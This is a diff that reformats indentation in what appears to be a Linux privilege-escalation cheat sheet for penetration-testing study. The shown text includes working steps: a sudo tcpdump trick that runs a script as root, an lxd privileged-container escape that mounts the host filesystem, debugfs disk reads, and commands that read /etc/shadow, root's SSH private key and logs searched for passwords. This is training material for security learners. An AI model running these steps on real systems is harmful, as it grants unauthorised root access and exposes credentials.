@@ -289,7 +289,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
     ```
 
     ```bash
-
     sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
     ```
 
@@ -379,7 +378,6 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
     ```bash
     cat /etc/crontab
-
     # Other ways:
     ls -la /etc/cron.hourly/
     ls -la /etc/cron.daily/
@@ -524,53 +522,53 @@ We can run commands inserted inside commands that we have permission for, e.g.:
   
   If the user belongs to the **`lxd`** group, they can **create containers**. With a privileged container + volume mount, you can **access the host filesystem as root**, even as a regular user.
 
-    ```bash
-    # Start LXD setup (use defaults):
-    lxd init
+  ```bash
+  # Start LXD setup (use defaults):
+  lxd init
 
-    # Check if there is already an image:
-    lxc image list
+  # Check if there is already an image:
+  lxc image list
 
-    # If there is no image, we download Alpine:
-    # CHECK the new version and change (GPT..):
-    wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/lxd.tar.xz
-    wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/rootfs.squashfs
+  # If there is no image, we download Alpine:
+  # CHECK the new version and change (GPT..):
+  wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/lxd.tar.xz
+  wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/rootfs.squashfs
 
-    lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+  lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
-    # IF THERE IS ALREADY an image, we import it:
-    # Ex: https://academy.hackthebox.com/module/51/section/1588
-    ```
+  # IF THERE IS ALREADY an image, we import it:
+  # Ex: https://academy.hackthebox.com/module/51/section/1588
+  ```
 
   Create privileged container with access to host:
 
-    ```bash
-    # Create the container with privileged permission:
-    lxc init alpine pwnbox -c security.privileged=true
+  ```bash
+  # Create the container with privileged permission:
+  lxc init alpine pwnbox -c security.privileged=true
 
-    # Add the host filesystem to the container:
-    lxc config device add pwnbox host-root disk source=/ path=/mnt/root recursive=true
+  # Add the host filesystem to the container:
+  lxc config device add pwnbox host-root disk source=/ path=/mnt/root recursive=true
 
-    # Start container and access shell:
-    lxc start pwnbox
-    lxc exec pwnbox /bin/sh
-    ```
+  # Start container and access shell:
+  lxc start pwnbox
+  lxc exec pwnbox /bin/sh
+  ```
 
   Now with root access:
 
-    ```bash
-    # Confirm root:
-    id
+  ```bash
+  # Confirm root:
+  id
 
-    # Access host filesystem:
-    cd /mnt/root/root
-    ls
+  # Access host filesystem:
+  cd /mnt/root/root
+  ls
 
-    # Sensitive data:
-    cat /mnt/root/etc/shadow
-    cat /mnt/root/root/.bash_history
-    cat /mnt/root/root/.ssh/id_rsa
-    ```
+  # Sensitive data:
+  cat /mnt/root/etc/shadow
+  cat /mnt/root/root/.bash_history
+  cat /mnt/root/root/.ssh/id_rsa
+  ```
 
   ---
   <a id="9.2-docker"></a>
@@ -704,17 +702,17 @@ We can run commands inserted inside commands that we have permission for, e.g.:
   <a id="9.3-disk"></a>
   ## **Disk**
 
-    ```bash
-    # Check partitions:
-    lsblk
+  ```bash
+  # Check partitions:
+  lsblk
 
-    # Use debugfs (example for sda1):
-    sudo debugfs /dev/sda1
+  # Use debugfs (example for sda1):
+  sudo debugfs /dev/sda1
 
-    # Inside debugfs:
-    ls /
-    cat /etc/shadow
-    ```
+  # Inside debugfs:
+  ls /
+  cat /etc/shadow
+  ```
 
   ---
   <a id="9.4-adm"></a>
@@ -722,15 +720,15 @@ We can run commands inserted inside commands that we have permission for, e.g.:
 
   Being in this group, we have permission to read all logs inside **`/var/log`**
 
-    ```bash
-    # Read privileged logs:
-    cat /var/log/auth.log
-    cat /var/log/syslog
+  ```bash
+  # Read privileged logs:
+  cat /var/log/auth.log
+  cat /var/log/syslog
 
-    # See cron jobs and executed commands:
-    grep CRON /var/log/syslog
-    grep -i password /var/log/*
-    ```
+  # See cron jobs and executed commands:
+  grep CRON /var/log/syslog
+  grep -i password /var/log/*
+  ```
 
 ---
 <a id="10-others"></a>
